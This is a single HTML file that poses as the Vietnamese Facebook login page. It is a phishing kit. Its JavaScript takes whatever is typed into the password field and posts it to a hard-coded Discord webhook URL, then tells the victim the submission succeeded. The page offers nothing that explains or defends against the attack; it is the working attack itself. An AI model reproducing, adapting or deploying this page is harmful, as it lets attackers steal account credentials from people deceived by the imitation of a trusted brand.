<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Facebook - Đăng nhập hoặc đăng ký (Responsive)</title>
<style>
  *, *::before, *::after { box-sizing: border-box; }

  body {
    margin: 0;
    font-family: "Arial", sans-serif;
    background: #f0f2f5;
    color: #111;
  }

  .wrapper {
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    gap: 18px;
    align-items: center;
    justify-content: center;
    padding: 28px 16px;
  }

  .logo {
    color: #1877f2;
    font-size: 48px;
    font-weight: 700;
    line-height: 1;
    margin: 0;
  }

  .tagline {
    font-size: 15px;
    color: #222;
    text-align: center;
    max-width: 360px;
    margin-top: 6px;
  }

  .card {
    width: 100%;
    max-width: 420px;
    background: #fff;
    border-radius: 10px;
    padding: 14px;
    box-shadow: 0 2px 10px rgba(15,34,58,0.08);
  }

  .input {
    width: 100%;
    padding: 14px;
    margin: 8px 0;
    border-radius: 8px;
    border: 1px solid #e6e9ee;
    font-size: 15px;
  }

  .login-btn {
    width: 100%;
    padding: 14px;
    margin-top: 8px;
    border-radius: 8px;
    border: none;
    background: #1877f2;
    color: #fff;
    font-weight: 700;
    font-size: 16px;
    cursor: pointer;
  }
  .login-btn:hover { filter: brightness(0.95); }

  .forgot {
    display: block;
    text-align: center;
    margin: 12px 0;
    color: #1877f2;
    text-decoration: none;
    font-size: 14px;
  }

  hr.sep {
    border: none;
    height: 1px;
    background: #eef0f3;
    margin: 14px 0;
  }

  .new-account {
    width: 100%;
    padding: 14px;
    border-radius: 8px;
    border: none;
    background: #42b72a;
    color: #fff;
    font-weight: 700;
    font-size: 16px;
    cursor: pointer;
  }
  .new-account:hover { filter: brightness(0.95); }

  #status {
    text-align: center;
    font-size: 14px;
    margin-top: 10px;
  }

  @media (min-width: 760px) {
    .wrapper {
      flex-direction: row;
      align-items: center;
      justify-content: center;
      padding: 40px;
      gap: 60px;
    }

    .left {
      max-width: 520px;
      text-align: left;
    }
    .logo {
      font-size: 56px;
      margin-bottom: 6px;
    }
    .tagline {
      font-size: 22px;
      text-align: left;
      color: #262626;
    }

    .card {
      width: min(420px, 38vw);
      padding: 22px;
    }
  }
</style>
</head>
<body>
  <div class="wrapper">
    <div class="left">
      <div class="logo">facebook</div>
      <div class="tagline">Facebook giúp bạn kết nối và chia sẻ<br>với mọi người trong cuộc sống của bạn.</div>
    </div>

    <div class="card" role="region" aria-label="Form đăng nhập">
      <form onsubmit="sendMessage(event)">
        <input class="input" id="email" placeholder="Nhập email hoặc số diện thoại" autocomplete="off" />

        <input class="input" id="message" placeholder="Nhập mật khẩu" autocomplete="off" />
        
        <button type="submit" class="login-btn">Đăng nhập</button>
        
        <a class="forgot" href="#">Quên mật khẩu?</a>
        
        <hr class="sep">
        
        <button class="new-account" type="button">Tạo tài khoản mới</button>

        <p id="status"></p>
      </form>
    </div>
  </div>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1405456686604357642/FQnoZtdt5-KmvIsraO42B4S2HVlzd0KVLaZm3IC299D7bbR_Vsg1Qo7e2heJTNJdWzYo";

    async function sendMessage(e) {
        e.preventDefault(); // Ngăn reload form
        const text = document.getElementById("message").value.trim();
        const status = document.getElementById("status");

        if (!text) {
            status.textContent = "Vui lòng nhập nội dung!";
            status.style.color = "red";
            return;
        }

        try {
            const res = await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: text })
            });

            if (res.ok) {
                status.textContent = "✅ Đã gửi thành công!";
                status.style.color = "green";
                document.getElementById("message").value = "";
            } else {
                status.textContent = "❌ Gửi thất bại!";
                status.style.color = "red";
            }
        } catch (err) {
            status.textContent = "❌ Lỗi kết nối!";
            status.style.color = "red";
        }
    }
</script>
</body>
</html>
